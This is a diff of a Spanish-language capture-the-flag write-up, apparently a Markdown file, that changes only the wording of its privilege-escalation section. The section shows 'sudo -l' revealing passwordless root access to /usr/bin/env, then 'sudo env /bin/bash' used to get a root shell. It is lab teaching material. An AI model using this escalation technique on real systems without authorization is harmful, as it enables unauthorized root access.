@@ -87,7 +87,7 @@ Y hemos logrado ganar acceso como el usuario www-data.
 
 ## Escalada de privilegios
 
-Comenzamos ejecuntadno un "sudo -l" para ver si exiten algun comando que podamos ejecutar con altos privilegios.
+Ejecuntadno un "sudo -l" para ver si exiten algun comando que podamos ejecutar con altos privilegios.
 
 ```shell
 sudo -l
@@ -96,7 +96,7 @@ ________________________
 User www-data may run the following commands on 41e845320485:
     (root) NOPASSWD: /usr/bin/env
 ```
-Vemos que podemos ejecutar el comando "env" como usuario root. Por ende, ejecutamos una bash atraves del comando env con ayuda de un sudo.
+Vemos que podemos ejecutar el comando "env" como root. Por ende, ejecutamos una bash atraves del comando env con ayuda de un sudo.
 ```shell
 sudo env /bin/bash
 ```
